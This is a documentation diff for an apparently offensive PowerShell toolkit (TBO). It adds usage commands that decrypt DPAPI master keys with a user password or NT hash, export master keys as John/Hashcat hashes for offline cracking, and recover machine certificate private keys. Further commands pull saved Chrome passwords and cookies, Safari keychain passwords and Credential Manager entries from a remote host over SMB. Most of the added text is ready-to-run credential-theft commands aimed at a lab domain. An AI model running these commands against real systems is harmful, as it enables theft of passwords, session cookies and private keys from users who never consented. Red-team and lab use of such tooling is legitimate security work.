@@ -506,14 +506,40 @@ Get-TBODpapiMasterKeyLocations -ServerName corp1-web01.corp1.lab.home-labs.lol -
 
 #### Get-TBODpapiMasterKeys
 
-Decrypts DPAPI master keys using DPAPI_SYSTEM from LSA secrets.
-Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw key bytes.
+Decrypts DPAPI master keys.
+Machine scope uses DPAPI_SYSTEM from LSA secrets, while user scope can be decrypted via user SID plus password or NT hash.
+Use DpapiMachineKeyBytes/DpapiUserKeyBytes when you already have raw DPAPI_SYSTEM key bytes.
+`UserNtlmHash` accepts either a 32-hex NT hash or an `LM:NT` string (only the NT portion is used for DPAPI).
+If a user-scoped master key cannot be decrypted with the current password/hash, `Get-TBODpapiMasterKeys` will attempt to use `CREDHIST` (when present) to handle password changes.
 
 ```powershell
 Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
   Get-TBODpapiMasterKeys
 Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -DpapiMachineKey <hex> -DpapiUserKey <hex>
 Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine -ShareName C$
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserNtlmHash '0123456789abcdef0123456789abcdef'
+```
+
+#### Get-TBODpapiMasterKeyHashes
+
+Formats DPAPI master key files into John/Hashcat `$DPAPImk$...` hashes for offline password cracking.
+Use `HashLine` (`{GUID}:$DPAPImk$...`) as the primary output for John/Hashcat.
+When a `Preferred` file is present, `IsPreferred` indicates the current preferred key.
+When a `BK-*` file is present in a user Protect directory, the hash context is set to 3 (domain); otherwise 1 (local).
+
+```powershell
+Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol
+
+# Dump only the John/Hashcat lines to a file
+Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
+  Select-Object -ExpandProperty HashLine |
+  Set-Content -Encoding ascii .\dpapi-masterkey-hashes.txt
+
+# Crack preferred keys first
+Get-TBODpapiMasterKeyHashes -ServerName corp1-web01.corp1.lab.home-labs.lol |
+  Where-Object IsPreferred |
+  Select-Object -ExpandProperty HashLine
 ```
 
 #### Find-TBODpapiBlobs
@@ -545,6 +571,64 @@ Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Pat
 Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Contoso -ValueName Blob -MasterKey $mk.MasterKey
 ```
 
+#### Get-TBOMachineCertificates
+
+Enumerates machine RSA private keys (CAPI and CNG), decrypts the DPAPI-protected key material using machine master keys, and attempts to map recovered keys to LocalMachine\My certificates by matching the RSA modulus.
+By default, only keys that match a certificate are returned. Use `-ShowAll` to return all recovered keys and decrypt failures.
+
+```powershell
+$keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine
+Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys
+
+# Include unmatched keys and failures
+Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys -ShowAll
+
+# Skip CNG keys (only scan CAPI MachineKeys)
+Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys -SkipCng
+```
+
+#### Get-TBOChromeLogins
+
+Reads Chrome's Login Data SQLite database for user profiles over SMB and decrypts saved passwords.
+Modern Chrome (v10/v11) uses an AES state key stored in `Local State` (`os_crypt.encrypted_key`), which is DPAPI-protected with user scope.
+To avoid remote SQLite locking issues, TBO snapshots the database (and optional `-wal`/`-shm` sidecars when present) to a local temp directory before querying.
+
+```powershell
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
+
+Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -ProfileName 'Profile 2' -MasterKeys $userKeys
+```
+
+#### Get-TBOChromeCookies
+
+Reads Chrome's Cookies SQLite database for user profiles over SMB and decrypts cookie values.
+Prefers `Network\\Cookies` (newer Chrome path) and falls back to legacy `Cookies` when needed.
+
+```powershell
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
+
+Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys |
+  Select-Object HostKey, Name, Value, ExpiresUtc
+```
+
+#### Get-TBOSafariKeychain
+
+Parses Safari for Windows `keychain.plist` files and decrypts DPAPI-protected password entries.
+Safari uses a fixed, application-specific DPAPI entropy value (same as dpapick's Safari probe), so the correct entropy is applied automatically.
+The Safari cleartext payload is length-prefixed; TBO extracts the length and then decodes the password bytes as text when possible.
+
+```powershell
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
+Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys
+
+# Specify a keychain.plist path directly (UNC or tbo: drive path)
+Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\jsmith\AppData\Roaming\Apple Computer\Safari\keychain.plist' -MasterKeys $userKeys
+```
+
 #### Get-TBOCredManFiles
 
 Enumerates Credential Manager files (Credentials and Vaults) for user and system profiles.
@@ -570,6 +654,10 @@ $keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Na
   Get-TBODpapiMasterKeys -Scope Machine
 Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine |
   Get-TBOCredManEntry -MasterKeys $keys
+
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserName 'jsmith' |
+  Get-TBOCredManEntry -MasterKeys $userKeys
 ```
 
 #### Get-TBORegAutoLogon
@@ -672,8 +760,23 @@ Remove-TBORegValue -ServerName corp1-web01.corp1.lab.home-labs.lol -Path HKLM\SO
 
 ## Local Logging
 
-Set `TITANIS_TBO_LOG` to `1` or to a file path. When set to `1`, logs go to
-`%TEMP%\Titanis.TBO.Smb2.log`.
+Set `TITANIS_TBO_LOG` to enable provider logging. Supported formats:
+
+- `TITANIS_TBO_LOG=1` (or `true`/`yes`) writes to `%TEMP%\Titanis.TBO.Smb2.log` at `Info`.
+- `TITANIS_TBO_LOG=<path>` writes to the specified file at `Info`.
+- `TITANIS_TBO_LOG=<level>` writes to `%TEMP%\Titanis.TBO.Smb2.log` at the specified level.
+- `TITANIS_TBO_LOG=<path>;<level>` writes to the specified file at the specified level.
+
+Levels: `Info`, `Verbose`, `Diagnostic`, `Debug`, `Warning`, `Error`.
+
+The log level is the minimum severity that will be written (lower/less severe levels are filtered out). From least to most verbose:
+
+- `Error`: Only errors are logged.
+- `Warning`: Warnings and errors.
+- `Info`: High-level info plus warnings/errors (currently minimal beyond the "logging enabled" banner).
+- `Verbose`: Adds higher-level flow and progress messages.
+- `Diagnostic`: Adds low-level protocol/registry retry/cache details.
+- `Debug`: Most verbose; includes diagnostic-level traces and extra debugging chatter.
 
 ## Build
 
